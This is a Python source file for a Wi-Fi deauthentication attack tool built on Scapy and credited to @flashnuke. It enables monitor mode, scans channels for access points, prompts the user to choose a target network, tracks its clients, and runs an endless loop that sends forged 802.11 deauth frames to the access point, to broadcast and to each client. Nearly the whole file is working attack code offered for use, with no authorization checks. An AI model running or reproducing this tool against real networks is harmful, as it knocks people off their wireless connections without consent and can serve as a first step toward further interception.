#!/usr/bin/env python3

import argparse
import pkg_resources
import copy
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings

from scapy.all import *
from time import sleep
from utils import *

conf.verb = 0
BANNER = """
 __      __ __  _____ __          ________                        __   __     
/  \    /  \__|/ ____\__|         \___    \   ____ _____   __ ___/  |_|  |__  
\   \/\/   /  \   __\|  |  ______  |       \_/ ___ \\__  \ |  |  \   __\  |  \ 
 \        /|  ||  |  |  | /_____/  |__      \  ___/ / __ \|  |  /|  | |   Y  \\
  \__/\__/ |__||__|  |__|         /_________/\_____/______/____/ |__| |___|__/ 
"""


class Interceptor:
    _BROADCAST_MACADDR = "ff:ff:ff:ff:ff:ff"

    def __init__(self, net_iface, skip_monitor_mode_setup, *args, **kwargs):
        self.interface = net_iface
        self._channel_sniff_timeout = 2
        self._max_miss_counter = 3
        self._scan_intv = 0.1
        self._deauth_intv = 0.1
        self._printf_res_intv = 1
        self._ssid_str_pad = 42  # total len 80

        self._abort = False
        self._current_channel_num = None
        self._current_channel_aps = set()

        self.attack_loop_count = 0

        self.target_ssid = str()
        self._active_aps = defaultdict(dict)
        self._duplicates = defaultdict(int)

        if not skip_monitor_mode_setup:
            printf("[*] Setting up monitor mode...")
            if not self._enable_monitor_mode():
                printf("[!] Monitor mode was not enabled properly")
                raise Exception("Unable to turn on monitor mode")
            printf("[*] Monitor mode was set up successfully")
        else:
            printf("[*] Skipping monitor mode setup...")

        self._channel_range = self._get_channels()

    def _enable_monitor_mode(self):
        for cmd in [f"sudo ip link set {self.interface} down",
                    f"sudo iw {self.interface} set monitor control",
                    f"sudo ip link set {self.interface} up"]:
            printf(f"[>] Running command -> '{cmd}'")
            if os.system(cmd):
                return False
        return True

    def _set_channel(self, ch_num, ch_freq):
        os.system(f"iw dev {self.interface} set channel {ch_num}")
        # TODO for x in sudo iwlist wlan0 channel
        self._current_channel_num = ch_num
        self._current_channel_freq = ch_freq

    def _get_channels(self):
        channels = list()
        for channel in os.popen(f'iwlist {self.interface} channel').readlines():
            if 'Channel' in channel and 'Current' not in channel:
                ch_data = channel.split('Channel')[1]
                ch_num, ch_freq = ch_data.split(':')
                ch_num = int(ch_num.strip())
                ch_freq = ch_freq.strip()
                ch_freq = 2.4 if ch_freq.startswith('2') else 5  # note only supports 2.4 and 5 atm
                channels.append(tuple([ch_num, ch_freq]))

        return channels

    def _ap_sniff_cb(self, pkt):
        try:
            if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11ProbeResp):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                if ap_mac == self._BROADCAST_MACADDR:  # TODO should not happen for these pkt types
                    return
                if ssid not in self._active_aps:
                    self._duplicates[ssid] = 0
                    self._active_aps[ssid] = self._init_ap_dict(ap_mac, self._current_channel_num,
                                                                self._current_channel_freq)
                    printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
                elif self._active_aps[ssid + self._duplicates[ssid] * ' ']["mac_addr"] != ap_mac and \
                        self._active_aps[ssid + self._duplicates[ssid] * ' ']["channel"] != self._current_channel_num and \
                        self._active_aps[ssid + self._duplicates[ssid] * ' ']["freq"] != self._current_channel_freq:
                    self._duplicates[ssid] += 1
                    mod_ssid = ssid + self._duplicates[ssid] * ' '
                    self._active_aps[mod_ssid] = self._init_ap_dict(ap_mac, self._current_channel_num,
                                                                    self._current_channel_freq)
                    printf(f"[+] Found {ssid} on channel {self._current_channel_num}...")
                if pkt.haslayer(Dot11ProbeResp):
                    c_mac = str(pkt.addr1)
                    if c_mac not in self._active_aps[ssid]["clients"]:  # TODO check broadcast
                        self._active_aps[ssid]["clients"].append(c_mac)
                self._current_channel_aps.add(ssid)  # todo wtf is this
        except:
            pass

    def _scan_channels_for_aps(self):
        try:
            for idx, ch_data in enumerate(self._channel_range):
                self._set_channel(*ch_data)
                printf(f"[*] Scanning channel {self._current_channel_num} ({idx + 1} out of {len(self._channel_range)})")
                sniff(prn=self._ap_sniff_cb, iface=self.interface, timeout=self._channel_sniff_timeout)
        except KeyboardInterrupt:
            return

    def _start_initial_ap_scan(self):
        printf(f"[*] Starting AP scan, please wait... ({len(self._channel_range)} channels total)")

        self._scan_channels_for_aps()

        to_remove = list()
        for ssid in self._active_aps.keys():
            if ssid not in self._current_channel_aps:
                self._active_aps[ssid]["miss_counter"] += 1
            if self._active_aps[ssid]["miss_counter"] >= self._max_miss_counter:
                to_remove.append(ssid)
        for ssid_to_remove in to_remove:
            del self._active_aps[ssid_to_remove]
        self._current_channel_aps.clear()

        ctr = 0
        target_map = dict()
        printf(DELIM)
        for ssid, ssid_stats in self._active_aps.items():
            ctr += 1
            target_map[ctr] = ssid
            pref = f"[{str(ctr).rjust(3, ' ')}] "
            printf(f"{pref}{self._generate_ssid_str(ssid, ssid_stats['channel'], ssid_stats['mac_addr'], len(pref))}")
        if not target_map:
            printf("[!] Not APs were found, quitting...")
            self._abort = True
            exit(0)

        chosen = -1
        while chosen not in target_map.keys():
            printf(f">>>>> Choose a target from {min(target_map.keys())} <-> {max(target_map.keys())}")
            chosen = int(input())

        return target_map[chosen]

    def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
        return f"{ssid.ljust(self._ssid_str_pad - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(self._ssid_str_pad // 2 , ' ')}{mcaddr}"

    def _clients_sniff_cb(self, pkt):
        try:
            if self._packet_confirms_client(pkt):
            #if pkt.haslayer(Dot11Elt):
                ap_mac = str(pkt.addr3)
                ssid = pkt[Dot11Elt].info.decode().strip() or ap_mac
                if ssid == self.target_ssid:
                    c_mac = pkt.addr1
                    if c_mac != self._BROADCAST_MACADDR and c_mac not in self._active_aps[ssid]["clients"]:
                        # todo check type of pkt instead
                        self._active_aps[ssid]["clients"].append(c_mac)
        except:
            pass

    def _packet_confirms_client(self, pkt):
        return (pkt.haslayer(Dot11AssoResp) and pkt[Dot11AssoResp].status == 0) or \
               (pkt.haslayer(Dot11ReassoResp) and pkt[Dot11ReassoResp].status == 0)

    def _listen_for_clients(self):
        printf(f"[*] Setting up a listener for new clients...")
        sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: self._abort is True)
    
    def _run_deauther(self):
        # todo add exc hgandling and exit
        printf(f"[*] Starting de-auth loop...")

        ap_mac = [self._active_aps[self.target_ssid]["mac_addr"]]

        rd_frm = RadioTap()
        deauth_frm = Dot11Deauth(reason=7)
        while not self._abort:
            self.attack_loop_count += 1
            sendp(rd_frm /
                  Dot11(addr1=self._BROADCAST_MACADDR, addr2=ap_mac, addr3=ap_mac) /
                  deauth_frm,
                  iface=self.interface)  # todo broadcast works?
            for client_mac in self._active_aps[self.target_ssid]["clients"]:
                sendp(rd_frm /
                      Dot11(addr1=client_mac, addr2=ap_mac, addr3=ap_mac) /
                      deauth_frm,
                      iface=self.interface)
                sendp(rd_frm /
                      Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
                      deauth_frm,
                      iface=self.interface)
                # sendp(rd_frm /
                #       Dot11(addr1=ap_mac, addr2=ap_mac, addr3=client_mac) /
                #       deauth_frm,
                #       iface=self.interface)
                # sendp(rd_frm /
                #       Dot11(addr1=client_mac, addr2=self._BROADCAST_MACADDR, addr3=self._BROADCAST_MACADDR) /
                #       deauth_frm,
                #       iface=self.interface)  # todo broadcast works? beware you might disconnect the client from other networks
        sleep(self._deauth_intv)

    def run(self):
        self.target_ssid = self._start_initial_ap_scan()
        printf(f"[*] Attacking target {self.target_ssid}")
        printf(f"[*] Setting channel -> {self._active_aps[self.target_ssid]['channel']}")
        self._set_channel(self._active_aps[self.target_ssid]["channel"])
        self.target_ssid = self.target_ssid.strip()  # strip() is important for dupes only after setting the channel

        for action in [self._run_deauther, self._listen_for_clients]:
            t = Thread(target=action, args=tuple(), daemon=True)
            t.start()

        printf(DELIM)
        printf("")
        try:
            start = self.get_time()
            while not self._abort:
                printf(f"[*] Target SSID{self.target_ssid.rjust(80 - 15, ' ')}")
                printf(f"[*] Channel{str(self._active_aps[self.target_ssid]['channel']).rjust(80 - 11, ' ')}")
                printf(f"[*] MAC addr{self._active_aps[self.target_ssid]['mac_addr'].rjust(80 - 12, ' ')}")
                printf(f"[*] Net interface{self.interface.rjust(80 - 17, ' ')}")
                printf(f"[*] Num of clients{str(len(self._active_aps[self.target_ssid]['clients'])).rjust(80 - 18, ' ')}")
                printf(f"[*] Elapsed sec {str(self.get_time() - start).rjust(80 - 16, ' ')}")
                sleep(self._printf_res_intv)
                clear_line(7)
        except KeyboardInterrupt:
            printf(f"\n{DELIM}")
            printf(f"[!] User asked to stop, quitting...")

    @staticmethod
    def _init_ap_dict(mac_addr: str, ch: int, freq: int) -> dict:
        return {
            "channel": ch,
            "freq": freq,
            "mac_addr": mac_addr,
            "clients": list(),
            "miss_counter": 0  # when this reaches self.max_miss_cnt, remove
        }

    @staticmethod
    def get_time():
        return int(time.time())


if __name__ == "__main__":
    printf(f"\n{BANNER}\n"
           f"Make sure of the following:\n"
           f"1. You are running as sudo\n"
           f"2. You are passing a correct network interface (-i / --iface <name>)\n"
           f"3. Your wireless adapter supports monitor mode (refer to docs)\n\n"  # todo add to docs how to
           f"Written by @flashnuke")
    printf(DELIM)

    if "linux" not in platform:
        raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
    with open("requirements.txt", "r") as reqs:
        pkg_resources.require(reqs.readlines())

    # arguments = define_args()
    parser = argparse.ArgumentParser(description='A simple program to perform a deauth attack')
    parser.add_argument('-i', '--iface', help='a network interface with monitor mode enabled (i.e -> "eth0")',
                        action='store', dest="net_iface", metavar="network_interface", required=True)
    parser.add_argument('-sm', '--skip-monitormode', help='skip automatic setup of monitor mode', action='store_true',
                        default=False, dest="skip_monitormode", required=False)
    pargs = parser.parse_args()

    invalidate_print()  # after arg parsing
    attacker = Interceptor(net_iface=pargs.net_iface, skip_monitor_mode_setup=pargs.skip_monitormode)
    attacker.run()

# TODO
# todo mode of dot11 a/b/n etc...
# todo broadcast ??
# todo reason=7
# todo type=8, subtype=12,
# todo kill network manager optional
